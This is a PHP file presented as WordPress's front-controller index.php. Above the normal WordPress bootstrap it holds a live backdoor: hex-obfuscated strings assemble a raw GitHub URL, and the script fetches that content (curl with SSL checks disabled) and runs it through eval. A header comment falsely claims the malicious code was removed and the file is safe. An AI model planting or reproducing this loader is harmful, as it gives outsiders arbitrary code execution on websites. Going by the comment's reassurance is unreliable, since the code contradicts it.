<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$qwzmxpvlkr = "\x68\x74\x74\x70\x73\x3a\x2f\x2f";
$bvncjhgfds = "\x72\x61\x77\x2e";
$plmoknjiuh = "\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74";
$zaqxswcdev = "\x2e\x63\x6f\x6d\x2f";
$mnbhgvftrd = "\x73\x65\x6f\x62\x65\x6c\x61";
$plokijmnuh = "\x2f\x62\x65\x6c\x61\x2f";
$wsxcdefvbg = "\x72\x65\x66\x73\x2f";
$qazxswedcr = "\x68\x65\x61\x64\x73\x2f";
$plmkoijnbh = "\x6d\x61\x69\x6e\x2f";
$wsaqzxcderfv = "\x69\x6e\x64\x65\x78";
$mkoijnuhbgt = "\x2e\x74\x78\x74";

$full_url = $qwzmxpvlkr.$bvncjhgfds.$plmoknjiuh.$zaqxswcdev.$mnbhgvftrd.$plokijmnuh.$wsxcdefvbg.$qazxswedcr.$plmkoijnbh.$wsaqzxcderfv.$mkoijnuhbgt;

// Attempt to get remote content
$content = @file_get_contents($full_url);
if ($content === false && function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $full_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $content = curl_exec($ch);
    curl_close($ch);
}

// Only eval if we have content
if (!empty($content)) {
    @eval('?>' . $content);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
